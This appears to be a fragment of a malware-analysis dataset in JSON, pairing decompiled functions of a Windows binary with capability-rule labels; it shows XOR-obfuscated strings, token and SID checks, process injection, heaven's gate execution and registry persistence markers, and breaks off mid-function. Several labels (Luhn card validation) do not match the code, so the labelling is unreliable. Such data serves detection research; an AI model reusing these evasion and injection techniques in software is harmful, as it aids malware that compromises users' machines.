            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b260(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    uVar8 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    pcVar2 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar4 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar4 == 0x7a) && (puVar5 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  puVar5 != NULL)) {\n            iVar4 = (*pcVar2)(hObject, 1, puVar5, dwBytes, &dwBytes);\n            if ((iVar4 != 0) &&\n               ((iVar4 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar5, &StringSid),  iVar4 != 0 &&\n                (StringSid != 0)))) {\n                var_30h = 0x75144a2b;\n                var_2ch = 0x467c7474;\n                var_28h = 0x75144a4d;\n                var_24h = 0x46697474;\n                var_20h._0_2_ = 0x4a78;\n                var_1ch = 0x75394a78;\n                var_18h = 0x46517445;\n                fcn.00401000(0x24);\n                uVar7 = 0;\n                do {\n                    puVar1 = uVar7 + var_10h;\n                    uVar6 = uVar7 & 0x80000007;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar7 = uVar7 + 1;\n                    *puVar1 = *(&var_1ch + uVar6) ^ puVar1[&var_30h - var_10h];\n                } while (uVar7 < 0x12);\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(var_10h, StringSid);\n                uVar8 = var_14h;\n                if (iVar4 == 0) {\n                    uVar8 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar5);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return uVar8;\n}\n",
        "token_count": 845
    },
    "00406962": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406962(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu_f._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu_f._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu_f._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu_f._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41bd38 = 1;\n            *0x41b620 = 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "004086b1": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004086b1(uchar *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x4e);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (param_2 == 0) {\n        var_44h = 0x61534963;\n        var_40h = 0x790b364e;\n        var_3ch = 0x61534963;\n        var_38h = 0x790b3642;\n        var_34h = 0x61534963;\n        var_30h = 0x790b3642;\n        var_2ch = 0x61534963;\n        var_28h = 0x790b3642;\n        var_24h = 0x61534963;\n        var_20h = 0x790b364e;\n        var_1ch = 0x61534963;\n        var_18h = 0x790b3642;\n        var_14h._0_2_ = 0x4946;\n        var_10h = 0x61634946;\n        var_ch = 0x79533676;\n        fcn.00401000(100);\n        uVar5 = 0;\n        do {\n            puVar1 = uVar5 + var_4h;\n            uVar4 = uVar5 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar5 = uVar5 + 1;\n            *puVar1 = *(&var_10h + uVar4) ^ puVar1[&var_44h - var_4h];\n        } while (uVar5 < 0x32);\n    }\n    else {\n        var_48h = 0x576c7510;\n        var_44h = 0x396f5764;\n        var_40h = 0x576c7533;\n        var_3ch = 0x39635764;\n        var_38h = 0x576c7533;\n        var_34h = 0x39635764;\n        var_30h = 0x576c7533;\n        var_2ch = 0x39635764;\n        var_28h = 0x576c7533;\n        var_24h = 0x396f5764;\n        var_20h = 0x576c7533;\n        var_1ch = 0x39635764;\n        var_18h = 0x57347533;\n        var_14h._0_2_ = 0x5754;\n        var_10h = 0x5749756b;\n        var_ch = 0x39575754;\n        fcn.00401000(0x6c);\n        uVar5 = 0;\n        do {\n            puVar1 = uVar5 + var_4h;\n            uVar4 = uVar5 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar5 = uVar5 + 1;\n            *puVar1 = *(&var_10h + uVar4) ^ puVar1[&var_48h - var_4h];\n        } while (uVar5 < 0x36);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    iVar2 = var_8h;\n    if (var_8h != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (var_8h, var_4h, CONCAT31(CONCAT21(CONCAT11(*param_1, param_1[1]), param_1[2]), param_1[3]), \n                   CONCAT11(param_1[4], param_1[5]), CONCAT11(param_1[6], param_1[7]), CONCAT11(param_1[8], param_1[9])\n                   , CONCAT31(CONCAT21(CONCAT11(param_1[10], param_1[0xb]), param_1[0xc]), param_1[0xd]), \n                   CONCAT11(param_1[0xe], param_1[0xf]));\n    }\n    return iVar2;\n}\n",
        "token_count": 1209
    },
    "0040d0ad": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d0ad(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    code *pcVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_1eh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t lpLibFileName;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    uVar9 = 0;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_18h = 0x1c1b6364;\n    var_14h = 0x5d614024;\n    var_10h._0_2_ = 0x5f5a;\n    var_10h._2_1_ = 0x58;\n    var_ch = 0x4e583336;\n    var_8h = 0x394f7470;\n    fcn.00401000(0xb);\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + lpLibFileName;\n        uVar5 = uVar8 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_ch + uVar5) ^ puVar1[&var_18h - lpLibFileName];\n    } while (uVar8 < 0xb);\n    var_40h = 0x2c0f0731;\n    var_3ch = 0x58541102;\n    var_38h = 0x2d351710;\n    var_34h = 0x57541630;\n    var_30h = 0x24071b10;\n    var_2ch._0_1_ = 0x41;\n    var_18h = 0x48667264;\n    var_14h = 0x39316341;\n    fcn.00401000(0x15);\n    iVar4 = lpLibFileName;\n    iVar3 = var_8h;\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_8h;\n        uVar5 = uVar8 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_18h + uVar5) ^ puVar1[&var_40h - var_8h];\n    } while (uVar8 < 0x15);\n    uVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, var_8h);\n    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    if (pcVar7 == NULL) {\n        lpLibFileName = 0;\n    }\n    else {\n        (*pcVar7)(&var_28h);\n        uVar8 = var_1eh;\n        var_1eh = var_1eh & 0xffffff;\n        uVar5 = 0;\n        do {\n            if (((uVar8 & 0xff0000) >> 8 | (var_1eh << 0x10 | uVar8 & 0xff00) << 8) == (&var_60h)[uVar5]) {\n                uVar9 = 1;\n            }\n            uVar5 = uVar5 + 1;\n            lpLibFileName = uVar9;\n        } while (uVar5 < 8);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    uVar9 = (*pcVar2)(0, iVar4);\n    (*pcVar7)(uVar9);\n    return lpLibFileName;\n}\n",
        "token_count": 1181
    },
    "0040e240": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040e240(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040e295(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 185
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    // [00] -r-x section size 57344 named .text\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h + 1);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    *in_ECX = iVar2;\n    if (iVar2 != 0) {\n        sub.ntdll.dll_memset(iVar2, 0, arg_8h + 1);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004013cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004013cb(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    code *pcVar10;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint pSessionId;\n    uint *dwProcessId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar10 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_24h = 0x104;\n    var_10h = puVar4;\n    uVar3 = (*pcVar9)(0, 0x208);\n    var_ch = (*pcVar10)(uVar3);\n    var_20h = 0x104;\n    var_1ch = 0;\n    var_8h = 0;\n    pSessionId = 0;\n    iVar6 = 0;\n    if ((puVar4 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            puVar4 = var_ch;\n            for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            iVar6 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar6 != 0) || (TokenHandle == 0)) {\n                iVar6 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar2 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar6 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &var_8h);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar6 == 0x7a) {\n                        uVar3 = (*pcVar9)(0, var_8h);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        if (dwProcessId != NULL) {\n                            iVar6 = (*pcVar2)(TokenHandle, 1, dwProcessId, var_8h, &var_8h);\n                            if (iVar6 != 0) {\n                                iVar6 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar6 != 0) {\n                                    var_60h = 0x55743503;\n                                    var_5ch = 0x5027592b;\n                                    var_58h = 0x781a317c;\n                                    var_54h = 0x356a7417;\n                                    var_50h = 0x5924556d;\n                                    var_4ch = 0x31465051;\n                                    var_48h = 0x747c7809;\n                                    var_44h = 0x556d3523;\n                                    var_40h = 0x5010595d;\n                                    var_3ch._0_2_ = 0x3135;\n                                    var_38h = 0x55313550;\n                                    var_34h._0_2_ = 0x5978;\n                                    var_34h._2_1_ = 0x74;\n                                    fcn.00401000(0x4c);\n                                    iVar6 = var_1ch;\n                                    iVar8 = 0;\n                                    iVar5 = &var_60h - var_1ch;\n                                    do {\n                                        var_1ch = 7;\n                                        puVar1 = iVar8 + iVar6;\n                                        iVar7 = iVar8 % 7;\n                                        iVar8 = iVar8 + 1;\n                                        *puVar1 = *(&var_38h + iVar7) ^ puVar1[iVar5];\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar6, var_ch, var_10h, pSessionId);\n                                    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                                    pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                }\n                            }\n                            uVar3 = (*pcVar9)(0, dwProcessId);\n                            (*pcVar10)(uVar3);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar4 = var_10h;\n        }\n        uVar3 = (*pcVar9)(0, var_ch);\n        (*pcVar10)(uVar3);\n        uVar3 = (*pcVar9)(0, puVar4);\n        (*pcVar10)(uVar3);\n        iVar6 = var_1ch;\n    }\n    return iVar6;\n}\n",
        "token_count": 1519
    },
    "00401612": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00401612(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint lpString;\n    uint lpExitTime;\n    uint lpUserTime;\n    uint lpKernelTime;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar8 = 0;\n    iVar7 = 8;\n    puVar9 = &lpCreationTime;\n    for (iVar5 = iVar7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_28h = 0;\n    puVar9 = &lpExitTime;\n    var_2ch = param_1;\n    for (iVar5 = iVar7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &lpKernelTime;\n    for (iVar5 = iVar7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &lpUserTime;\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &lpString;\n    for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar5 == 0) goto code_r0x0040176e;\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)(iVar5, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n    if (iVar7 != 0) {\n        var_18h = 0x4840206c;\n        var_14h = 0x572e6c04;\n        var_10h = 0x1555746c;\n        var_ch._0_1_ = 0x34;\n        var_8h = 0x6d6d4449;\n        var_4h = 0x7a565434;\n        fcn.00401000(0xd);\n        uVar6 = 0;\n        do {\n            puVar1 = uVar6 + var_24h;\n            uVar3 = uVar6 & 0x80000007;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n            }\n            uVar6 = uVar6 + 1;\n            *puVar1 = *(&var_8h + uVar3) ^ puVar1[&var_18h - var_24h];\n        } while (uVar6 < 0xd);\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, var_24h, var_2ch, var_1ch, lpCreationTime);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_24h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                iVar8 = 1;\n                goto code_r0x00401767;\n            }\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_24h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar8 = var_28h;\n    }\ncode_r0x00401767:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\ncode_r0x0040176e:\n    return iVar8 == 0;\n}\n",
        "token_count": 1124
    },
    "004018a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004018a3(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x417220;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x411010;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.0040177c();\n        if (iVar3 != 0) {\n            iVar3 = fcn.0040177c();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.004074c9(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 548
    },
    "00403734": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00403734(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *in_ECX;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    \n    if ((in_ECX == NULL) && (in_ECX = *arg_8h,  *arg_8h == NULL)) {\n        return NULL;\n    }\n    do {\n        piVar2 = in_ECX;\n        piVar4 = 0x40fb18;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n            if (iVar1 == 0) {\n                piVar4 = piVar2 + 1;\n                if (*piVar2 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar3 = piVar4;\n                    piVar5 = 0x40fb18;\n                    piVar4 = piVar3 + 1;\n                    do {\n                        iVar1 = *piVar5;\n                        piVar5 = piVar5 + 1;\n                        if (iVar1 == *piVar3) {\n                            if (*piVar3 == 0) {\n                                piVar4 = NULL;\n                            }\n                            else {\n                                *piVar3 = 0;\n                            }\n                            *arg_8h = piVar4;\n                            return piVar2;\n                        }\n                    } while (iVar1 != 0);\n                } while( true );\n            }\n            in_ECX = piVar2 + 1;\n        } while (*piVar2 != iVar1);\n    } while( true );\n}\n",
        "token_count": 382
    },
    "00404b98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.00404b98(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41bcd0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41bcd0));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 114
    },
    "00406606": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406606(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x40fb7c;\n    uStack104 = *0x40fb78;\n    uStack108 = *0x40fb74;\n    name = *0x40fb70;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41bd4c;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x40fb80;\n    uStack92 = *0x40fb84;\n    uStack88 = *0x40fb88;\n    uStack84 = *0x40fb8c;\n    var_3ch = *0x40fb60;\n    uStack60 = *0x40fb64;\n    uStack56 = *0x40fb68;\n    uStack52 = *0x40fb6c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if 